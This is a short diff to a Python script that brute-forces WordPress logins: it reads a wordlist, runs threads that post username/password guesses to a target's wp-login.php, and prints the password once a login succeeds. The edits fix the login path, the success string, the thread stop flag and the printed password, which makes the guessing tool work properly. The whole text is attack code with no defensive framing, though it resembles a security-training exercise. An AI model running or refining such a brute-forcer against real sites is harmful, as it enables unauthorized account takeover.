@@ -7,8 +7,8 @@ import sys
 import threading
 import time
 
-SUCCESS = "Welcome to Wordpress!"
-TARGET = input("Target URL: ") + "/wordpress/wp-login.php"
+SUCCESS = "Welcome to WordPress!"
+TARGET = input("Target URL: ") + "/wp-login.php"
 WORDLIST = "wordlist.txt"
 
 def get_words():
@@ -47,8 +47,8 @@ class Bruter:
         resp0 = session.get(self.url)
         params = get_params(resp0.content)
         params['log'] = self.username
-
-        while not passwords.empty():
+        self.found = False
+        while not passwords.empty() and not self.found:
             time.sleep(5)
             passwd = passwords.get()
             print(f"Trying username/password {self.username}/{passwd:<10}")
@@ -59,7 +59,7 @@ class Bruter:
                 self.found = True
                 print(f"\nBruteforcing successful/")
                 print("Username is %s" % self.username)
-                print("Password is %s\n" % brute)
+                print("Password is %s\n" % params['pwd'])
                 print("done: now cleaning up other threads...")
 
 if __name__ == "__main__":
